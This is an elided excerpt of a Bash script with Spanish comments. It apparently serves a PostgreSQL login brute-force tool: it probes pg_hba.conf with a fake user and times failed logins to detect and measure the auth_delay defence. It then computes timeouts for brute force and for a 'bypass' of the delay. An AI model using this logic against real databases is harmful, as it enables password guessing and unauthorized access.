...
modo_analisis() {
    ...
    # ── PRE-CHECK pg_hba usando MEASURE_TIMEOUT ─────────────────────────────
    # Usamos MEASURE_TIMEOUT aquí para que incluso con auth_delay=30s el probe
    # espere la respuesta real de PostgreSQL y no devuelva un falso "indeterminado".
    echo -e "${CYAN}${BOLD}[PRE-CHECK]${NC} Verificando comportamiento de pg_hba.conf..."
    echo -e "  ${DIM}→ Sondeando con usuario ficticio: ${FAKE_USER} (timeout: ${MEASURE_TIMEOUT}s)${NC}"
    local HBA_TODOS=false

    verificar_hba_acepta_todos "$MEASURE_TIMEOUT"
    local hba_result=$?

    case $hba_result in
        0)
            HBA_TODOS=true
            # Alerta sin abortar — el análisis continúa para dar el diagnóstico completo
        ...
        1)
            ...
            ;;
        2)
            echo -e "  ${YELLOW}[?] Respuesta ambigua en pre-check (timeout > ${MEASURE_TIMEOUT}s).${NC}"
            echo -e "  ${YELLOW}    Delay extremadamente alto o problema de red. Procediendo con análisis.${NC}\n"
            ;;
    esac
    ...
    # ── PASO 2: Usuario INEXISTENTE con MEASURE_TIMEOUT ─────────────────────
    # T_FAKE captura el tiempo REAL de auth_delay (si hay global delay)
    # porque MEASURE_TIMEOUT=60s es mayor que cualquier delay razonable.
    ...
    local T_FAKE; T_FAKE=$(medir_tiempo_respuesta "$FAKE_USER" "$FAKE_PASS" "$MEASURE_TIMEOUT")
    echo -e "  ${GREEN}↳ Tiempo promedio: ${WHITE}${T_FAKE}s${NC}\n"

    # ── PASO 3: Usuario OBJETIVO con MEASURE_TIMEOUT ────────────────────────
    ...
    local T_TARGET; T_TARGET=$(medir_tiempo_respuesta "$USER_DEFAULT" "$FAKE_PASS" "$MEASURE_TIMEOUT")
    ...
    if [ "$DIFF_SIG" = "1" ]; then
        ...
        if [ "$IS_GROWING" = "1" ]; then
            ...
            DELAY_TIPO="activo"
            SUGGESTED_T=$(echo "scale=1; $T_TARGET2 + 3.0" | bc)
            ...
            SUGGESTED_T_BYPASS=$(echo "scale=2; $T_FAKE + 0.3" | bc)
            # BRUTE FORCE: timeout MAYOR al delay → espera respuesta completa
            SUGGESTED_T=$(echo "scale=1; $T_TARGET + 2.0" | bc)
        fi
        ...
        DELAY_TIPO="global"
        # Suggested = tiempo real del delay + 2s de margen de seguridad
        SUGGESTED_T=$(echo "scale=1; $T_FAKE + 2.0" | bc)
...
if [[ -n "$USER_FILE" ]]; then
    ...
    eliminar_sesion   # limpiar sesión tras consumirla
